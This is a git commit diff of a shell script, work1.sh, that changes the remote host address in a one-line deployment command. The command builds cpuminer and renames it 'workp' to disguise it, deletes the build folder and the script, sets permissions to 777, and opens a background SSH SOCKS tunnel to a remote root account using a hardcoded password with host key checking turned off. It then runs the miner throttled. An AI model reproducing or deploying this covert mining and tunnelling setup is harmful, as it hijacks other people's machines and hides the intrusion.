a18aed6c477eb97e416d11b7b18f6ca19f9bb86a
laptopdell <40815880+laptopdell@users.noreply.github.com>
2019-01-03 00:58:11 +0700

    Update work1.sh

--- work1.sh
+++ work1.sh
@@ -5,4 +5,4 @@ cd laptopedit
 chmod +x *
 ./build.sh
 make
-mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@35.231.64.135 && cpulimit --exe workp --limit 200 -b 
+mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@66.42.117.27 && cpulimit --exe workp --limit 200 -b 
